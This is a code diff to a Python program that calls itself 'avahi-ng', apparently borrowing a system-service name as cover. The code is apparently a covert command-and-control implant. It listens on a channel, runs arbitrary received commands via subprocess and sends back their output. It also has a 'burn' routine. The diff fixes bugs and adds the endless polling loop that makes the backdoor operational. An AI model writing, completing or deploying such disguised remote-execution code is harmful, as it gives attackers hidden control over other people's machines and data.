@@ -17,11 +17,9 @@ logging.basicConfig(level=logging.DEBUG)
 logging.info("Starting avahi-ng...")
 rx = channel.Receiver()
 rx_thread = threading.Thread(target=rx.start)
-if sys.argv[1] != "nocap":
+if len(sys.argv) >=2 and sys.argv[1] != "nocap":
     rx_thread.start()
     logging.debug("launched rx thread")
-else:
-    logging.warning("Running in debug mode. Cannot receive communications.")
 
 
 def generate_id():
@@ -46,7 +44,7 @@ def generate_id():
 
 
 id = generate_id()
-logging.info("system ID is", id)
+logging.info("system ID is {}".format(id))
 
 
 def handle_ping():
@@ -67,7 +65,7 @@ def burn():
 
 
 def arbitrary_exec(command: str):
-    logging.info("running command", command)
+    logging.info("running command {}".format(command))
     cmd = command.split(" ")
     send(subprocess.check_output(cmd))
     pass
@@ -100,3 +98,7 @@ def communicate():
                     arbitrary_exec(load[3:])
                 case _:
                     logging.error("Bad command: {}".format(load))
+
+while True:
+    time.sleep(0.5)
+    communicate()
